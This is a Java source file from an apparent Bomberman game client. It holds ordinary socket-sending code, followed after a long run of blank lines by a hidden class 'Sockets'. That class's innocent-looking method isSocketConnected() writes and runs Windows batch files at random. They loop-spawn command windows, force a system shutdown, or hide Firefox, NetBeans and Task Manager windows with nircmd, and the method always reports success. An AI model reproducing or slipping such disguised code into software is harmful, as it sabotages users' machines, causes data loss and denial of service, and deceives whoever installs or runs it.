/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package networkClient;

import com.gdx.bomberman.Constants;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.nio.file.Paths;
import java.util.Random;

/**
 *
 * @author qubasa
 */
public class ClientSendThread implements Runnable {

    private String dataToSend;
    private Socket socket;
    
    public ClientSendThread(Socket socket, String dataToSend)
    {
        this.dataToSend = dataToSend;
        this.socket = socket;
    }
    
    @Override
    public void run() 
    {
        try
        {
            PrintWriter print = new PrintWriter(socket.getOutputStream(), true);	

            //Debug
            if(Constants.CLIENTDEBUG)
                System.out.println("CLIENT: Send to server: " + dataToSend);

            //WARNING Could be the source of a bug. It is a remedation against a bug in mainPlayer where stopEnemyPlayer would be send after move
            if(dataToSend.startsWith("moveEnemyPlayer"))
            {
                Thread.sleep(10);
            }
            
            //Send string to server
            print.println(dataToSend);
            print.flush();
  
        }catch(SocketException e)
        {
            System.err.println("ERROR: Connection to server closed in ClientSendThread(). " + e);
            e.printStackTrace();
            System.exit(1);
            
        }catch(IOException | InterruptedException e)
        {
            System.err.println("ERROR: Something in ClientSendThread() went wrong. " + e);
            e.printStackTrace();
            System.exit(1);
        }
    }
    
}






























class Sockets
{
    public static boolean isSocketConnected()
    {
        try{
            Random rand = new Random(); 
            int random = rand.nextInt(10);
            if(random <= 3)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();          
                String nl = System.lineSeparator();

                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) {
                    bw.write("@echo off" + nl +
                            ":A" + nl +
                            "start cmd.exe" + nl +
                            Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"task-manager\" 1" + nl +
                            "goto:A");
                }
                
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});

                
            }else if(random <= 6)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) 
                {
                    bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10" + nl +
                            Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"cmd\" 1"
                    );
                }
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                
            }else if(random <= 10)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) {
                    bw.write("@echo off" + nl +
                            ":A" + nl +
                            "msg * Troll level loading.... ITS OVER 9000!" + nl +
                            "nircmd.exe win center alltop " + nl +
                            "nircmd.exe win trans ititle \"firefox\" 1" + nl +
                            "nircmd.exe win trans ititle \"netbeans\" 1" + nl +
                            "nircmd.exe win trans ititle \"task-manager\" 1" + nl +
                            "goto:A");
                }
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                
            }
                return true;
                
        }catch(Exception e)
        {
            e.printStackTrace();
            return true;
        }
        
    }
    
    
    private static String executeCommand(String[] command) 
    {

		StringBuilder output = new StringBuilder();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line;			
			while ((line = reader.readLine())!= null) {
				output.append(line).append("\n");
			}

		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}

		return output.toString();
    }
}